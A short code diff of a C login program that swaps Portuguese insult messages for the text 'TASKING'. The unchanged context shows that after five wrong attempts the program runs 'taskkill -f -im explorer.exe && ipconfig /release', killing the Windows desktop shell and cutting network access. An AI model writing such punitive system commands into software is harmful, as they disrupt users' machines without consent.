@@ -41,7 +41,7 @@ void main () {
         erro += 1;
         if (erro>=5){
             system("taskkill -f -im explorer.exe && ipconfig /release");
-	printf("SE FUDEU OTÁRIO")
+	printf("TASKING")
         }
     }
     printf("* * * * PASSW >> ");
@@ -53,7 +53,7 @@ void main () {
         erro += 1;
         if (erro>=5){
             system("taskkill -f -im explorer.exe && ipconfig /release");
-	printf("JÁ ERA MAN");
+	printf("TASKING");
         }
     }
     if (login==7339){
